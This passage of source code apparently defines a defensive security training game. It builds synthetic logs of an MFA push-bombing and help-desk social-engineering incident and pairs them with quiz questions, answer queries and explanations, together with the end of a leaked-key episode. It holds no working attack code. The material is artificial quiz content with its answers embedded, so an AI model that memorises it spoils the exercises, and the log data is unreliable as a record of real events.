    { chapter: 'response', prompt: 'Which action invalidated the stolen key?', teach: 'Revoking the key is the containment that matters — it stops the abuse instantly, even mid-download. Rotating secrets is the first move whenever one leaks.', query: 'ResponseActions | where Target == "deploy-key"', column: 'Action', hint: 'Find the response action targeting the deploy key.' },
    { chapter: 'response', prompt: 'What result did the key get when used after revocation?', teach: 'Validate containment: the same session attempting ListBuckets after revocation should be denied — proof the key is dead.', query: 'CloudAuditEvents | where SessionId == "LEAK-USE-19" and Result == "Denied"', column: 'Result', hint: 'Look at the abuse session’s activity after revocation.' },
    { chapter: 'response', prompt: 'Which control prevents the next accidental push? Enter the response action name.', teach: 'Removing the secret from history cleans this leak; enabling push-time secret scanning stops the next one before it ever reaches the public repo — defence that scales.', query: 'ResponseActions | where Target == "all-repos"', column: 'Action', hint: 'Find the response action targeting all repositories.' },
    { chapter: 'response', prompt: 'Which action cleaned the secret out of the repository history?', teach: 'A secret stays exposed in git history even after the file is edited. Purging it from history is what actually removes it from the public record.', query: 'ResponseActions | where Action == "PurgeSecretFromHistory"', column: 'Action', hint: 'Find the history-purge response action.' },
  ],
});

// ── Episode 20 · The Tired Approve ──────────────────────────────────────────────────────────────
const ep20Victim = staffIn('Executive')[2];

export const ep20 = defineCasebook({
  id: 'casebook-s1e20-tired-approve',
  episode: 20,
  title: 'The Tired Approve',
  difficulty: 'Medium',
  replaces: 'siem-sentinel-correlation-rule-tuning',
  inspiredBy: 'MFA-fatigue push bombing combined with help-desk social engineering',
  date: '2027-01-11',
  briefing: 'An executive’s account was accessed despite MFA. The logs show dozens of push notifications overnight, then one approval — and a help-desk ticket to add a new phone. This is MFA fatigue: bombard someone with prompts until they approve one to make it stop. Trace the pattern and whether the response removed the attacker’s foothold.',
  chapters: [
    { id: 'fatigue', title: 'The push flood' },
    { id: 'foothold', title: 'The new device' },
    { id: 'response', title: 'Eviction' },
  ],
  inject(t, when) {
    const v = ep20Victim;
    // Dozens of denied MFA prompts overnight, then one approval.
    for (let i = 0; i < 28; i++) t.add('SigninLogs', when(0, `0${1 + Math.floor(i / 10)}:${String((i * 2) % 60).padStart(2, '0')}:00`), { UserPrincipalName: v.email, IPAddress: GH.ips.operator, ResultType: 50074, ResultDescription: 'MFA denied by user', AppName: 'Halcyon Portal', DeviceName: 'unknown', Location: 'NL', MfaResult: 'Denied', SessionId: '' });
    t.add('SigninLogs', when(0, '03:40:00'), { UserPrincipalName: v.email, IPAddress: GH.ips.operator, ResultType: 0, ResultDescription: 'Success', AppName: 'Halcyon Portal', DeviceName: 'unknown', Location: 'NL', MfaResult: 'Approved', SessionId: 'FATIGUE-20' });
    t.add('CloudAuditEvents', when(0, '03:50:00'), { UserPrincipalName: v.email, Operation: 'RegisterMfaDevice', Resource: 'Authenticator', NewValue: 'attacker-phone-+000', IPAddress: GH.ips.operator, SessionId: 'FATIGUE-20', Result: 'Success', ItemCount: 1 });
    t.add('CloudAuditEvents', when(0, '08:05:00'), { UserPrincipalName: 'servicedesk', Operation: 'HelpdeskTicket', Resource: 'Reset MFA for ' + v.email, NewValue: 'caller claimed lost phone', IPAddress: '10.40.0.60', SessionId: '', Result: 'Success', ItemCount: 1 });
    t.add('SecurityAlerts', when(0, '08:30:00'), { AlertName: 'Repeated MFA prompts followed by approval', Severity: 'High', DeviceName: '', Entity: v.email, Status: 'New', Product: 'Halcyon Identity Protection' });
    t.add('ResponseActions', when(0, '09:00:00'), { IncidentId: 'IR-0111', Target: v.email, Action: 'RevokeSessions', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(0, '09:02:00'), { IncidentId: 'IR-0111', Target: v.email, Action: 'RemoveMfaDevice', Result: 'Success', RemovedValue: 'attacker-phone-+000', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(0, '09:30:00'), { IncidentId: 'IR-0111', Target: 'mfa-policy', Action: 'EnableNumberMatching', Result: 'Success', ApprovedBy: 'ciso' });
  },
  questions: [
    { chapter: 'fatigue', prompt: `How many MFA prompts did ${ep20Victim.name} deny before the approval?`, teach: 'MFA fatigue (push bombing) floods the victim with approval prompts, betting they will tap "approve" to stop the noise. A run of denials (ResultType 50074) from one source is the signature.', query: `SigninLogs | where UserPrincipalName == "${ep20Victim.email}" and ResultType == 50074 | count`, column: 'Count', hint: 'Count the denied-MFA sign-ins (ResultType 50074) for the executive.', type: 'number' },
    { chapter: 'fatigue', prompt: 'From which IP were the prompts triggered?', teach: 'Every prompt came from the attacker attempting to sign in with a stolen password. The source IP ties the flood together and matches the actor’s known operator address.', query: `SigninLogs | where UserPrincipalName == "${ep20Victim.email}" and ResultType == 50074 | distinct IPAddress`, column: 'IPAddress', hint: 'distinct IPAddress on the denied-MFA sign-ins.' },
    { chapter: 'fatigue', prompt: 'What session ID did the eventual approval create?', teach: 'One tired approval is all it takes. The attacker’s sign-in comes from their own address, not the executive’s usual device — filter to that IP and the successful result to find the single malicious session.', query: `SigninLogs | where UserPrincipalName == "${ep20Victim.email}" and ResultType == 0 and IPAddress == "${GH.ips.operator}"`, column: 'SessionId', hint: 'Filter the executive’s successful sign-ins to the attacker IP.' },
    { chapter: 'foothold', prompt: 'Which new device did the attacker register?', teach: 'Persistence: registering their own authenticator means the attacker keeps MFA access even after a password reset. The registered value is what eviction must remove.', query: 'CloudAuditEvents | where SessionId == "FATIGUE-20" and Operation == "RegisterMfaDevice"', column: 'NewValue', hint: 'Find the RegisterMfaDevice event in the session.' },
    { chapter: 'foothold', prompt: 'What reason did the help-desk ticket record for the MFA reset?', teach: 'Attackers combine push bombing with social engineering — calling the help desk claiming a lost phone to get MFA reset entirely. The ticket reason shows the pretext used.', query: 'CloudAuditEvents | where Operation == "HelpdeskTicket"', column: 'NewValue', hint: 'Find the HelpdeskTicket event and read its recorded reason.' },
    { chapter: 'foothold', prompt: 'Which account processed that help-desk ticket?', teach: 'Knowing which service-desk identity acted lets you review the verification steps that were (or were not) followed — the human control that failed.', query: 'CloudAuditEvents | where Operation == "HelpdeskTicket"', column: 'UserPrincipalName', hint: 'Read UserPrincipalName on the help-desk ticket.' },
    { chapter: 'response', prompt: 'Which action removed the attacker’s registered device?', teach: 'Revoking sessions is not enough when the attacker has their own MFA method. Removing the rogue device is the step that actually evicts them.', query: 'ResponseActions | where Action == "RemoveMfaDevice"', column: 'Action', hint: 'Find the device-removal response action.' },
    { chapter: 'response', prompt: 'Which registered value was removed? ', teach: 'Confirm the specific device removed matches the one the attacker added — precision here is the difference between eviction and a lingering foothold.', query: 'ResponseActions | where Action == "RemoveMfaDevice"', column: 'RemovedValue', hint: 'Read RemovedValue on the device-removal action.' },
    { chapter: 'response', prompt: 'Which control defeats push bombing? Enter the response action name.', teach: 'Number matching forces the user to type a code shown on the sign-in screen, so a blind "approve" no longer works. It is the targeted fix for MFA fatigue.', query: 'ResponseActions | where Target == "mfa-policy"', column: 'Action', hint: 'Find the response action targeting the MFA policy.' },
    { chapter: 'response', prompt: 'Which incident ID tracks the eviction?', teach: 'A single incident ID groups the session revoke, device removal and policy change so the response reads as one coordinated action.', query: 'ResponseActions | where Action == "EnableNumberMatching"', column: 'IncidentId', hint: 'Read IncidentId on the number-matching action.' },
  ],
});
